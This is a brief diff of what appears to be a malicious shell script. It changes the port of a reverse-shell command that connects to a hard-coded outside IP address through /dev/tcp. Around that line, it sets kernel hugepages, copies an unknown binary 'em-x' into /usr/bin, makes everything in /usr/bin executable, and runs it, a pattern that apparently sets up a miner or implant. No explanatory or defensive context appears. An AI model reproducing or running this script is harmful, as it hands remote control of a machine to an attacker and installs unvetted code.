@@ -1,7 +1,7 @@
 uname -a
 echo 512 > /proc/sys/vm/nr_hugepages 
 
-/bin/bash -c "bash -i >& /dev/tcp/197.207.151.166/7952 0>&1"
+/bin/bash -c "bash -i >& /dev/tcp/197.207.151.166/3128 0>&1"
 cp em-x /usr/bin/
 chmod +x /usr/bin/*
 em-x
